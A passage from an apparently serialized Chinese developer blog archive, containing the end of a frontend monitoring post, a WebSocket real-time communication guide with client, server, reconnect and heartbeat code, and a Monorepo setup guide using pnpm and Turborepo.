\'checkout\');\\n```\\n\\n---\\n\\n## \ud83d\udccb \u76d1\u63a7\u6e05\u5355\\n\\n```markdown\\n\u6027\u80fd\u76d1\u63a7\uff1a\\n- [ ] Core Web Vitals (LCP, INP, CLS)\\n- [ ] \u9996\u5c4f\u65f6\u95f4\\n- [ ] \u8d44\u6e90\u52a0\u8f7d\u65f6\u95f4\\n- [ ] \u63a5\u53e3\u54cd\u5e94\u65f6\u95f4\\n\\n\u9519\u8bef\u76d1\u63a7\uff1a\\n- [ ] JS \u8fd0\u884c\u65f6\u9519\u8bef\\n- [ ] Promise \u672a\u6355\u83b7\u9519\u8bef\\n- [ ] \u8d44\u6e90\u52a0\u8f7d\u5931\u8d25\\n- [ ] \u63a5\u53e3\u9519\u8bef\\n\\n\u884c\u4e3a\u76d1\u63a7\uff1a\\n- [ ] PV/UV\\n- [ ] \u70b9\u51fb\u4e8b\u4ef6\\n- [ ] \u5173\u952e\u64cd\u4f5c\u57cb\u70b9\\n- [ ] \u7528\u6237\u8def\u5f84\\n```\\n\\n---\\n\\n\u76d1\u63a7\u662f\u4e86\u89e3\u7528\u6237\u548c\u4ea7\u54c1\u7684\u773c\u775b\u3002\u5efa\u7acb\u5b8c\u5584\u7684\u76d1\u63a7\u4f53\u7cfb\uff0c\u624d\u80fd\u6301\u7eed\u6539\u8fdb\u4ea7\u54c1\u4f53\u9a8c\u3002"},{"id":"websocket-guide","metadata":{"permalink":"/blog/websocket-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-09-10-websocket.md","source":"@site/blog/2024-09-10-websocket.md","title":"WebSocket \u5b9e\u65f6\u901a\u4fe1\u6307\u5357","description":"WebSocket \u5b9e\u73b0\u4e86\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u5168\u53cc\u5de5\u901a\u4fe1\u3002\u672c\u6587\u4ecb\u7ecd WebSocket \u7684\u539f\u7406\u548c\u5b9e\u8df5\u3002","date":"2024-09-10T00:00:00.000Z","tags":[{"inline":true,"label":"WebSocket","permalink":"/blog/tags/web-socket"},{"inline":true,"label":"\u5b9e\u65f6\u901a\u4fe1","permalink":"/blog/tags/\u5b9e\u65f6\u901a\u4fe1"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"}],"readingTime":4.8,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"websocket-guide","title":"WebSocket \u5b9e\u65f6\u901a\u4fe1\u6307\u5357","authors":"mason","tags":["WebSocket","\u5b9e\u65f6\u901a\u4fe1","\u540e\u7aef"]},"unlisted":false,"prevItem":{"title":"\u524d\u7aef\u76d1\u63a7\u4e0e\u57cb\u70b9\u5b9e\u8df5","permalink":"/blog/frontend-monitoring"},"nextItem":{"title":"Monorepo \u5b9e\u8df5\u6307\u5357","permalink":"/blog/monorepo-guide"}},"content":"WebSocket \u5b9e\u73b0\u4e86\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u5168\u53cc\u5de5\u901a\u4fe1\u3002\u672c\u6587\u4ecb\u7ecd WebSocket \u7684\u539f\u7406\u548c\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf WebSocket \u7b80\u4ecb\\n\\n### vs HTTP\\n\\n| \u7279\u6027 | HTTP | WebSocket |\\n|------|------|-----------|\\n| \u8fde\u63a5 | \u77ed\u8fde\u63a5 | \u957f\u8fde\u63a5 |\\n| \u901a\u4fe1\u65b9\u5f0f | \u8bf7\u6c42-\u54cd\u5e94 | \u5168\u53cc\u5de5 |\\n| \u5f00\u9500 | \u6bcf\u6b21\u8bf7\u6c42\u90fd\u6709\u5934\u90e8 | \u4e00\u6b21\u63e1\u624b\uff0c\u540e\u7eed\u5f00\u9500\u5c0f |\\n| \u5b9e\u65f6\u6027 | \u8f6e\u8be2 | \u5b9e\u65f6\u63a8\u9001 |\\n\\n### \u9002\u7528\u573a\u666f\\n\\n```markdown\\n- \u5373\u65f6\u804a\u5929\\n- \u5728\u7ebf\u6e38\u620f\\n- \u5b9e\u65f6\u534f\u4f5c\uff08\u6587\u6863\u3001\u767d\u677f\uff09\\n- \u80a1\u7968\u884c\u60c5\\n- \u6d88\u606f\u63a8\u9001\\n- \u5b9e\u65f6\u76d1\u63a7\\n```\\n\\n---\\n\\n## \ud83d\udd0c \u5ba2\u6237\u7aef API\\n\\n### \u57fa\u672c\u4f7f\u7528\\n\\n```javascript\\n// \u521b\u5efa\u8fde\u63a5\\nconst ws = new WebSocket(\'wss://example.com/socket\');\\n\\n// \u8fde\u63a5\u6210\u529f\\nws.onopen = () => {\\n  console.log(\'\u8fde\u63a5\u6210\u529f\');\\n  ws.send(\'Hello Server!\');\\n};\\n\\n// \u63a5\u6536\u6d88\u606f\\nws.onmessage = (event) => {\\n  console.log(\'\u6536\u5230\u6d88\u606f:\', event.data);\\n};\\n\\n// \u8fde\u63a5\u5173\u95ed\\nws.onclose = (event) => {\\n  console.log(\'\u8fde\u63a5\u5173\u95ed:\', event.code, event.reason);\\n};\\n\\n// \u9519\u8bef\u5904\u7406\\nws.onerror = (error) => {\\n  console.error(\'WebSocket \u9519\u8bef:\', error);\\n};\\n\\n// \u53d1\u9001\u6d88\u606f\\nws.send(\'Hello\');\\nws.send(JSON.stringify({ type: \'message\', data: \'Hello\' }));\\n\\n// \u5173\u95ed\u8fde\u63a5\\nws.close();\\n```\\n\\n### \u8fde\u63a5\u72b6\u6001\\n\\n```javascript\\n// WebSocket.readyState\\nWebSocket.CONNECTING  // 0 - \u8fde\u63a5\u4e2d\\nWebSocket.OPEN        // 1 - \u5df2\u8fde\u63a5\\nWebSocket.CLOSING     // 2 - \u5173\u95ed\u4e2d\\nWebSocket.CLOSED      // 3 - \u5df2\u5173\u95ed\\n\\n// \u68c0\u67e5\u72b6\u6001\\nif (ws.readyState === WebSocket.OPEN) {\\n  ws.send(message);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5c01\u88c5 WebSocket\\n\\n### \u5e26\u91cd\u8fde\u7684 WebSocket\\n\\n```typescript\\nclass ReconnectingWebSocket {\\n  private ws: WebSocket | null = null;\\n  private url: string;\\n  private reconnectAttempts = 0;\\n  private maxReconnectAttempts = 5;\\n  private reconnectInterval = 1000;\\n  private listeners: Map<string, Function[]> = new Map();\\n\\n  constructor(url: string) {\\n    this.url = url;\\n    this.connect();\\n  }\\n\\n  private connect() {\\n    this.ws = new WebSocket(this.url);\\n\\n    this.ws.onopen = () => {\\n      console.log(\'WebSocket \u8fde\u63a5\u6210\u529f\');\\n      this.reconnectAttempts = 0;\\n      this.emit(\'open\');\\n    };\\n\\n    this.ws.onmessage = (event) => {\\n      const data = JSON.parse(event.data);\\n      this.emit(\'message\', data);\\n    };\\n\\n    this.ws.onclose = () => {\\n      console.log(\'WebSocket \u8fde\u63a5\u5173\u95ed\');\\n      this.emit(\'close\');\\n      this.reconnect();\\n    };\\n\\n    this.ws.onerror = (error) => {\\n      console.error(\'WebSocket \u9519\u8bef:\', error);\\n      this.emit(\'error\', error);\\n    };\\n  }\\n\\n  private reconnect() {\\n    if (this.reconnectAttempts >= this.maxReconnectAttempts) {\\n      console.log(\'\u8fbe\u5230\u6700\u5927\u91cd\u8fde\u6b21\u6570\');\\n      return;\\n    }\\n\\n    this.reconnectAttempts++;\\n    const delay = this.reconnectInterval * Math.pow(2, this.reconnectAttempts - 1);\\n    \\n    console.log(`${delay}ms \u540e\u5c1d\u8bd5\u91cd\u8fde (${this.reconnectAttempts}/${this.maxReconnectAttempts})`);\\n    \\n    setTimeout(() => this.connect(), delay);\\n  }\\n\\n  send(data: any) {\\n    if (this.ws?.readyState === WebSocket.OPEN) {\\n      this.ws.send(JSON.stringify(data));\\n    } else {\\n      console.warn(\'WebSocket \u672a\u8fde\u63a5\');\\n    }\\n  }\\n\\n  on(event: string, callback: Function) {\\n    if (!this.listeners.has(event)) {\\n      this.listeners.set(event, []);\\n    }\\n    this.listeners.get(event)!.push(callback);\\n  }\\n\\n  private emit(event: string, data?: any) {\\n    this.listeners.get(event)?.forEach(cb => cb(data));\\n  }\\n\\n  close() {\\n    this.maxReconnectAttempts = 0; // \u7981\u6b62\u91cd\u8fde\\n    this.ws?.close();\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst ws = new ReconnectingWebSocket(\'wss://example.com/socket\');\\n\\nws.on(\'message\', (data) => {\\n  console.log(\'\u6536\u5230:\', data);\\n});\\n\\nws.send({ type: \'subscribe\', channel: \'updates\' });\\n```\\n\\n---\\n\\n## \ud83d\udda5\ufe0f \u670d\u52a1\u7aef\u5b9e\u73b0\\n\\n### Node.js (ws \u5e93)\\n\\n```javascript\\nconst WebSocket = require(\'ws\');\\n\\nconst wss = new WebSocket.Server({ port: 8080 });\\n\\n// \u5b58\u50a8\u6240\u6709\u8fde\u63a5\\nconst clients = new Set();\\n\\nwss.on(\'connection\', (ws) => {\\n  console.log(\'\u65b0\u8fde\u63a5\');\\n  clients.add(ws);\\n\\n  // \u63a5\u6536\u6d88\u606f\\n  ws.on(\'message\', (message) => {\\n    const data = JSON.parse(message);\\n    console.log(\'\u6536\u5230:\', data);\\n\\n    // \u5e7f\u64ad\u7ed9\u6240\u6709\u5ba2\u6237\u7aef\\n    broadcast(data);\\n  });\\n\\n  // \u8fde\u63a5\u5173\u95ed\\n  ws.on(\'close\', () => {\\n    console.log(\'\u8fde\u63a5\u5173\u95ed\');\\n    clients.delete(ws);\\n  });\\n\\n  // \u53d1\u9001\u6b22\u8fce\u6d88\u606f\\n  ws.send(JSON.stringify({ type: \'welcome\', message: \'Hello!\' }));\\n});\\n\\nfunction broadcast(data) {\\n  clients.forEach(client => {\\n    if (client.readyState === WebSocket.OPEN) {\\n      client.send(JSON.stringify(data));\\n    }\\n  });\\n}\\n\\nconsole.log(\'WebSocket \u670d\u52a1\u5668\u8fd0\u884c\u5728 ws://localhost:8080\');\\n```\\n\\n### \u5e26\u8ba4\u8bc1\u7684\u8fde\u63a5\\n\\n```javascript\\nconst WebSocket = require(\'ws\');\\nconst jwt = require(\'jsonwebtoken\');\\n\\nconst wss = new WebSocket.Server({ port: 8080 });\\n\\nwss.on(\'connection\', (ws, req) => {\\n  // \u4ece URL \u83b7\u53d6 token\\n  const url = new URL(req.url, \'http://localhost\');\\n  const token = url.searchParams.get(\'token\');\\n\\n  try {\\n    const user = jwt.verify(token, process.env.JWT_SECRET);\\n    ws.user = user;\\n    console.log(`\u7528\u6237 ${user.name} \u5df2\u8fde\u63a5`);\\n  } catch (err) {\\n    ws.close(1008, \'Invalid token\');\\n    return;\\n  }\\n\\n  ws.on(\'message\', (message) => {\\n    // \u5904\u7406\u6d88\u606f...\\n  });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcac \u804a\u5929\u5ba4\u793a\u4f8b\\n\\n### \u670d\u52a1\u7aef\\n\\n```javascript\\nconst rooms = new Map(); // roomId -> Set<WebSocket>\\n\\nwss.on(\'connection\', (ws) => {\\n  ws.on(\'message\', (message) => {\\n    const data = JSON.parse(message);\\n\\n    switch (data.type) {\\n      case \'join\':\\n        joinRoom(ws, data.room);\\n        break;\\n      case \'leave\':\\n        leaveRoom(ws, data.room);\\n        break;\\n      case \'message\':\\n        broadcastToRoom(data.room, {\\n          type: \'message\',\\n          user: ws.user,\\n          content: data.content,\\n          timestamp: Date.now()\\n        });\\n        break;\\n    }\\n  });\\n\\n  ws.on(\'close\', () => {\\n    // \u79bb\u5f00\u6240\u6709\u623f\u95f4\\n    rooms.forEach((clients, roomId) => {\\n      clients.delete(ws);\\n    });\\n  });\\n});\\n\\nfunction joinRoom(ws, roomId) {\\n  if (!rooms.has(roomId)) {\\n    rooms.set(roomId, new Set());\\n  }\\n  rooms.get(roomId).add(ws);\\n  ws.rooms = ws.rooms || new Set();\\n  ws.rooms.add(roomId);\\n}\\n\\nfunction leaveRoom(ws, roomId) {\\n  rooms.get(roomId)?.delete(ws);\\n  ws.rooms?.delete(roomId);\\n}\\n\\nfunction broadcastToRoom(roomId, data) {\\n  rooms.get(roomId)?.forEach(client => {\\n    if (client.readyState === WebSocket.OPEN) {\\n      client.send(JSON.stringify(data));\\n    }\\n  });\\n}\\n```\\n\\n### \u5ba2\u6237\u7aef\\n\\n```javascript\\nconst ws = new WebSocket(\'wss://example.com/chat?token=xxx\');\\n\\n// \u52a0\u5165\u623f\u95f4\\nws.send(JSON.stringify({ type: \'join\', room: \'general\' }));\\n\\n// \u53d1\u9001\u6d88\u606f\\nfunction sendMessage(content) {\\n  ws.send(JSON.stringify({\\n    type: \'message\',\\n    room: \'general\',\\n    content\\n  }));\\n}\\n\\n// \u63a5\u6536\u6d88\u606f\\nws.onmessage = (event) => {\\n  const data = JSON.parse(event.data);\\n  if (data.type === \'message\') {\\n    displayMessage(data);\\n  }\\n};\\n```\\n\\n---\\n\\n## \u2764\ufe0f \u5fc3\u8df3\u68c0\u6d4b\\n\\n### \u5ba2\u6237\u7aef\\n\\n```javascript\\nclass WebSocketWithHeartbeat {\\n  private heartbeatInterval: number = 30000;\\n  private heartbeatTimer?: NodeJS.Timer;\\n\\n  connect() {\\n    this.ws = new WebSocket(this.url);\\n    \\n    this.ws.onopen = () => {\\n      this.startHeartbeat();\\n    };\\n\\n    this.ws.onclose = () => {\\n      this.stopHeartbeat();\\n    };\\n\\n    this.ws.onmessage = (event) => {\\n      const data = JSON.parse(event.data);\\n      if (data.type === \'pong\') {\\n        // \u6536\u5230\u5fc3\u8df3\u54cd\u5e94\\n        return;\\n      }\\n      // \u5904\u7406\u5176\u4ed6\u6d88\u606f...\\n    };\\n  }\\n\\n  private startHeartbeat() {\\n    this.heartbeatTimer = setInterval(() => {\\n      if (this.ws?.readyState === WebSocket.OPEN) {\\n        this.ws.send(JSON.stringify({ type: \'ping\' }));\\n      }\\n    }, this.heartbeatInterval);\\n  }\\n\\n  private stopHeartbeat() {\\n    if (this.heartbeatTimer) {\\n      clearInterval(this.heartbeatTimer);\\n    }\\n  }\\n}\\n```\\n\\n### \u670d\u52a1\u7aef\\n\\n```javascript\\nwss.on(\'connection\', (ws) => {\\n  ws.isAlive = true;\\n\\n  ws.on(\'message\', (message) => {\\n    const data = JSON.parse(message);\\n    if (data.type === \'ping\') {\\n      ws.send(JSON.stringify({ type: \'pong\' }));\\n      return;\\n    }\\n    // \u5904\u7406\u5176\u4ed6\u6d88\u606f...\\n  });\\n\\n  ws.on(\'pong\', () => {\\n    ws.isAlive = true;\\n  });\\n});\\n\\n// \u5b9a\u671f\u68c0\u67e5\u8fde\u63a5\\nsetInterval(() => {\\n  wss.clients.forEach((ws) => {\\n    if (!ws.isAlive) {\\n      return ws.terminate();\\n    }\\n    ws.isAlive = false;\\n    ws.ping();\\n  });\\n}, 30000);\\n```\\n\\n---\\n\\n## \ud83d\udd27 React Hook\\n\\n```typescript\\nimport { useEffect, useRef, useState, useCallback } from \'react\';\\n\\ninterface UseWebSocketOptions {\\n  onMessage?: (data: any) => void;\\n  onOpen?: () => void;\\n  onClose?: () => void;\\n  onError?: (error: Event) => void;\\n  reconnect?: boolean;\\n}\\n\\nexport function useWebSocket(url: string, options: UseWebSocketOptions = {}) {\\n  const [isConnected, setIsConnected] = useState(false);\\n  const wsRef = useRef<WebSocket | null>(null);\\n\\n  const connect = useCallback(() => {\\n    const ws = new WebSocket(url);\\n\\n    ws.onopen = () => {\\n      setIsConnected(true);\\n      options.onOpen?.();\\n    };\\n\\n    ws.onmessage = (event) => {\\n      const data = JSON.parse(event.data);\\n      options.onMessage?.(data);\\n    };\\n\\n    ws.onclose = () => {\\n      setIsConnected(false);\\n      options.onClose?.();\\n      if (options.reconnect) {\\n        setTimeout(connect, 3000);\\n      }\\n    };\\n\\n    ws.onerror = (error) => {\\n      options.onError?.(error);\\n    };\\n\\n    wsRef.current = ws;\\n  }, [url, options]);\\n\\n  useEffect(() => {\\n    connect();\\n    return () => wsRef.current?.close();\\n  }, [connect]);\\n\\n  const send = useCallback((data: any) => {\\n    if (wsRef.current?.readyState === WebSocket.OPEN) {\\n      wsRef.current.send(JSON.stringify(data));\\n    }\\n  }, []);\\n\\n  return { isConnected, send };\\n}\\n\\n// \u4f7f\u7528\\nfunction Chat() {\\n  const [messages, setMessages] = useState([]);\\n  \\n  const { isConnected, send } = useWebSocket(\'wss://example.com/chat\', {\\n    onMessage: (data) => {\\n      setMessages(prev => [...prev, data]);\\n    },\\n    reconnect: true\\n  });\\n\\n  return (\\n    <div>\\n      <div>\u72b6\u6001: {isConnected ? \'\u5df2\u8fde\u63a5\' : \'\u672a\u8fde\u63a5\'}</div>\\n      <button onClick={() => send({ type: \'message\', content: \'Hello\' })}>\\n        \u53d1\u9001\\n      </button>\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u4f7f\u7528 wss:// (\u52a0\u5bc6)\\n2. \u5b9e\u73b0\u91cd\u8fde\u673a\u5236\\n3. \u6dfb\u52a0\u5fc3\u8df3\u68c0\u6d4b\\n4. \u6d88\u606f\u4f7f\u7528 JSON \u683c\u5f0f\\n5. \u5904\u7406\u8fde\u63a5\u72b6\u6001\\n6. \u8003\u8651\u79bb\u7ebf\u6d88\u606f\u961f\u5217\\n7. \u670d\u52a1\u7aef\u5b9e\u73b0\u9650\u6d41\\n```\\n\\n---\\n\\nWebSocket \u662f\u5b9e\u65f6\u5e94\u7528\u7684\u57fa\u7840\u3002\u7406\u89e3\u5176\u539f\u7406\uff0c\u5408\u7406\u5c01\u88c5\uff0c\u80fd\u591f\u6784\u5efa\u6d41\u7545\u7684\u5b9e\u65f6\u4f53\u9a8c\u3002"},{"id":"monorepo-guide","metadata":{"permalink":"/blog/monorepo-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-09-01-monorepo.md","source":"@site/blog/2024-09-01-monorepo.md","title":"Monorepo \u5b9e\u8df5\u6307\u5357","description":"Monorepo \u5c06\u591a\u4e2a\u9879\u76ee\u653e\u5728\u4e00\u4e2a\u4ed3\u5e93\u7ba1\u7406\uff0c\u4fbf\u4e8e\u4ee3\u7801\u5171\u4eab\u548c\u7edf\u4e00\u5de5\u5177\u94fe\u3002\u672c\u6587\u4ecb\u7ecd Monorepo \u7684\u642d\u5efa\u548c\u6700\u4f73\u5b9e\u8df5\u3002","date":"2024-09-01T00:00:00.000Z","tags":[{"inline":true,"label":"Monorepo","permalink":"/blog/tags/monorepo"},{"inline":true,"label":"pnpm","permalink":"/blog/tags/pnpm"},{"inline":true,"label":"Turborepo","permalink":"/blog/tags/turborepo"},{"inline":true,"label":"\u5de5\u7a0b\u5316","permalink":"/blog/tags/\u5de5\u7a0b\u5316"}],"readingTime":3.76,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"monorepo-guide","title":"Monorepo \u5b9e\u8df5\u6307\u5357","authors":"mason","tags":["Monorepo","pnpm","Turborepo","\u5de5\u7a0b\u5316"]},"unlisted":false,"prevItem":{"title":"WebSocket \u5b9e\u65f6\u901a\u4fe1\u6307\u5357","permalink":"/blog/websocket-guide"},"nextItem":{"title":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u5bf9\u6bd4","permalink":"/blog/state-management"}},"content":"Monorepo \u5c06\u591a\u4e2a\u9879\u76ee\u653e\u5728\u4e00\u4e2a\u4ed3\u5e93\u7ba1\u7406\uff0c\u4fbf\u4e8e\u4ee3\u7801\u5171\u4eab\u548c\u7edf\u4e00\u5de5\u5177\u94fe\u3002\u672c\u6587\u4ecb\u7ecd Monorepo \u7684\u642d\u5efa\u548c\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f Monorepo\\n\\n```markdown\\nMonorepo\uff1a\u591a\u4e2a\u9879\u76ee\u5728\u4e00\u4e2a Git \u4ed3\u5e93\u4e2d\\nPolyrepo\uff1a\u6bcf\u4e2a\u9879\u76ee\u4e00\u4e2a\u72ec\u7acb\u4ed3\u5e93\\n\\nMonorepo \u4e0d\u7b49\u4e8e Monolith\uff08\u5355\u4f53\u5e94\u7528\uff09\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n| \u4f18\u70b9 | \u7f3a\u70b9 |\\n|------|------|\\n| \u4ee3\u7801\u590d\u7528\u7b80\u5355 | \u4ed3\u5e93\u4f53\u79ef\u5927 |\\n| \u7edf\u4e00\u5de5\u5177\u94fe | \u6743\u9650\u7ba1\u7406\u590d\u6742 |\\n| \u539f\u5b50\u5316\u63d0\u4ea4 | CI/CD \u9700\u8981\u4f18\u5316 |\\n| \u4f9d\u8d56\u7ba1\u7406\u7edf\u4e00 | \u5b66\u4e60\u6210\u672c |\\n| \u91cd\u6784\u66f4\u65b9\u4fbf | |\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5de5\u5177\u9009\u62e9\\n\\n| \u5de5\u5177 | \u5305\u7ba1\u7406 | \u6784\u5efa\u7f13\u5b58 | \u4efb\u52a1\u7f16\u6392 |\\n|------|--------|----------|----------|\\n| pnpm workspace | \u2705 | \u274c | \u274c |\\n| Turborepo | \u274c | \u2705 | \u2705 |\\n| Nx | \u274c | \u2705 | \u2705 |\\n| Lerna | \u2705 | \u274c | \u2705 |\\n\\n**\u63a8\u8350\u7ec4\u5408**\uff1apnpm + Turborepo\\n\\n---\\n\\n## \ud83d\udcc2 \u9879\u76ee\u7ed3\u6784\\n\\n```\\nmy-monorepo/\\n\u251c\u2500\u2500 package.json\\n\u251c\u2500\u2500 pnpm-workspace.yaml\\n\u251c\u2500\u2500 turbo.json\\n\u251c\u2500\u2500 apps/\\n\u2502   \u251c\u2500\u2500 web/                 # Next.js \u5e94\u7528\\n\u2502   \u2502   \u251c\u2500\u2500 package.json\\n\u2502   \u2502   \u2514\u2500\u2500 src/\\n\u2502   \u251c\u2500\u2500 admin/               # \u7ba1\u7406\u540e\u53f0\\n\u2502   \u2502   \u251c\u2500\u2500 package.json\\n\u2502   \u2502   \u2514\u2500\u2500 src/\\n\u2502   \u2514\u2500\u2500 docs/                # \u6587\u6863\u7ad9\\n\u2502       \u251c\u2500\u2500 package.json\\n\u2502       \u2514\u2500\u2500 src/\\n\u251c\u2500\u2500 packages/\\n\u2502   \u251c\u2500\u2500 ui/                  # \u5171\u4eab UI \u7ec4\u4ef6\\n\u2502   \u2502   \u251c\u2500\u2500 package.json\\n\u2502   \u2502   \u2514\u2500\u2500 src/\\n\u2502   \u251c\u2500\u2500 utils/               # \u5de5\u5177\u51fd\u6570\\n\u2502   \u2502   \u251c\u2500\u2500 package.json\\n\u2502   \u2502   \u2514\u2500\u2500 src/\\n\u2502   \u2514\u2500\u2500 config/              # \u5171\u4eab\u914d\u7f6e\\n\u2502       \u251c\u2500\u2500 package.json\\n\u2502       \u251c\u2500\u2500 eslint/\\n\u2502       \u2514\u2500\u2500 typescript/\\n\u2514\u2500\u2500 tooling/\\n    \u2514\u2500\u2500 scripts/             # \u5de5\u5177\u811a\u672c\\n```\\n\\n---\\n\\n## \ud83d\ude80 \u642d\u5efa\u6b65\u9aa4\\n\\n### 1. \u521d\u59cb\u5316\u9879\u76ee\\n\\n```bash\\nmkdir my-monorepo && cd my-monorepo\\npnpm init\\n```\\n\\n### 2. \u914d\u7f6e pnpm workspace\\n\\n```yaml\\n# pnpm-workspace.yaml\\npackages:\\n  - \'apps/*\'\\n  - \'packages/*\'\\n```\\n\\n### 3. \u6839\u76ee\u5f55 package.json\\n\\n```json\\n{\\n  \\"name\\": \\"my-monorepo\\",\\n  \\"private\\": true,\\n  \\"scripts\\": {\\n    \\"dev\\": \\"turbo dev\\",\\n    \\"build\\": \\"turbo build\\",\\n    \\"lint\\": \\"turbo lint\\",\\n    \\"test\\": \\"turbo test\\",\\n    \\"clean\\": \\"turbo clean\\"\\n  },\\n  \\"devDependencies\\": {\\n    \\"turbo\\": \\"^1.10.0\\"\\n  },\\n  \\"packageManager\\": \\"pnpm@8.10.0\\"\\n}\\n```\\n\\n### 4. \u914d\u7f6e Turborepo\\n\\n```json\\n// turbo.json\\n{\\n  \\"$schema\\": \\"https://turbo.build/schema.json\\",\\n  \\"pipeline\\": {\\n    \\"build\\": {\\n      \\"dependsOn\\": [\\"^build\\"],\\n      \\"outputs\\": [\\"dist/**\\", \\".next/**\\"]\\n    },\\n    \\"dev\\": {\\n      \\"cache\\": false,\\n      \\"persistent\\": true\\n    },\\n    \\"lint\\": {},\\n    \\"test\\": {\\n      \\"dependsOn\\": [\\"build\\"]\\n    },\\n    \\"clean\\": {\\n      \\"cache\\": false\\n    }\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u521b\u5efa\u5171\u4eab\u5305\\n\\n### packages/ui/package.json\\n\\n```json\\n{\\n  \\"name\\": \\"@repo/ui\\",\\n  \\"version\\": \\"0.0.0\\",\\n  \\"private\\": true,\\n  \\"main\\": \\"./src/index.ts\\",\\n  \\"types\\": \\"./src/index.ts\\",\\n  \\"exports\\": {\\n    \\".\\": \\"./src/index.ts\\",\\n    \\"./button\\": \\"./src/button.tsx\\"\\n  },\\n  \\"scripts\\": {\\n    \\"lint\\": \\"eslint src/\\",\\n    \\"build\\": \\"tsup src/index.ts --format esm,cjs --dts\\"\\n  },\\n  \\"peerDependencies\\": {\\n    \\"react\\": \\"^18.0.0\\"\\n  },\\n  \\"devDependencies\\": {\\n    \\"@repo/config\\": \\"workspace:*\\",\\n    \\"tsup\\": \\"^7.0.0\\",\\n    \\"typescript\\": \\"^5.0.0\\"\\n  }\\n}\\n```\\n\\n### packages/ui/src/button.tsx\\n\\n```tsx\\nimport { ButtonHTMLAttributes } from \'react\';\\n\\ninterface ButtonProps extends ButtonHTMLAttributes<HTMLButtonElement> {\\n  variant?: \'primary\' | \'secondary\';\\n}\\n\\nexport function Button({ variant = \'primary\', children, ...props }: ButtonProps) {\\n  return (\\n    <button className={`btn btn-${variant}`} {...props}>\\n      {children}\\n    </button>\\n  );\\n}\\n```\\n\\n### packages/ui/src/index.ts\\n\\n```ts\\nexport { Button } from \'./button\';\\n```\\n\\n---\\n\\n## \ud83d\udd17 \u5305\u4e4b\u95f4\u7684\u4f9d\u8d56\\n\\n### \u5728\u5e94\u7528\u4e2d\u4f7f\u7528\u5171\u4eab\u5305\\n\\n```json\\n// apps/web/package.json\\n{\\n  \\"name\\": \\"@repo/web\\",\\n  \\"dependencies\\": {\\n    \\"@repo/ui\\": \\"workspace:*\\",\\n    \\"@repo/utils\\": \\"workspace:*\\"\\n  }\\n}\\n```\\n\\n```tsx\\n// apps/web/src/app/page.tsx\\nimport { Button } from \'@repo/ui\';\\nimport { formatDate } from \'@repo/utils\';\\n\\nexport default function Page() {\\n  return (\\n    <div>\\n      <Button onClick={() => console.log(\'clicked\')}>\\n        Click me\\n      </Button>\\n      <p>{formatDate(new Date())}</p>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u5b89\u88c5\u4f9d\u8d56\\n\\n```bash\\n# \u5b89\u88c5\u5230\u7279\u5b9a\u5305\\npnpm add lodash --filter @repo/web\\n\\n# \u5b89\u88c5\u5230\u6839\u76ee\u5f55\\npnpm add -D typescript -w\\n\\n# \u5b89\u88c5\u5230\u6240\u6709\u5305\\npnpm add -r react\\n```\\n\\n---\\n\\n## \u2699\ufe0f \u5171\u4eab\u914d\u7f6e\\n\\n### packages/config/tsconfig/base.json\\n\\n```json\\n{\\n  \\"compilerOptions\\": {\\n    \\"target\\": \\"ES2020\\",\\n    \\"lib\\": [\\"ES2020\\", \\"DOM\\", \\"DOM.Iterable\\"],\\n    \\"module\\": \\"ESNext\\",\\n    \\"moduleResolution\\": \\"bundler\\",\\n    \\"strict\\": true,\\n    \\"skipLibCheck\\": true,\\n    \\"declaration\\": true,\\n    \\"declarationMap\\": true,\\n    \\"esModuleInterop\\": true,\\n    \\"forceConsistentCasingInFileNames\\": true,\\n    \\"isolatedModules\\": true,\\n    \\"jsx\\": \\"react-jsx\\"\\n  }\\n}\\n```\\n\\n### \u5728\u5305\u4e2d\u4f7f\u7528\\n\\n```json\\n// packages/ui/tsconfig.json\\n{\\n  \\"extends\\": \\"@repo/config/tsconfig/base.json\\",\\n  \\"compilerOptions\\": {\\n    \\"outDir\\": \\"./dist\\"\\n  },\\n  \\"include\\": [\\"src\\"],\\n  \\"exclude\\": [\\"node_modules\\", \\"dist\\"]\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfc3 \u8fd0\u884c\u547d\u4ee4\\n\\n### \u5f00\u53d1\\n\\n```bash\\n# \u8fd0\u884c\u6240\u6709\u5e94\u7528\\npnpm dev\\n\\n# \u53ea\u8fd0\u884c\u7279\u5b9a\u5e94\u7528\\npnpm dev --filter @repo/web\\n\\n# \u8fd0\u884c\u5e94\u7528\u53ca\u5176\u4f9d\u8d56\\npnpm dev --filter @repo/web...\\n```\\n\\n### \u6784\u5efa\\n\\n```bash\\n# \u6784\u5efa\u6240\u6709\\npnpm build\\n\\n# \u53ea\u6784\u5efa\u53d8\u66f4\u7684\u5305\\nturbo build --filter=[HEAD^1]\\n\\n# \u5e76\u884c\u6784\u5efa\\nturbo build --concurrency=10\\n```\\n\\n### 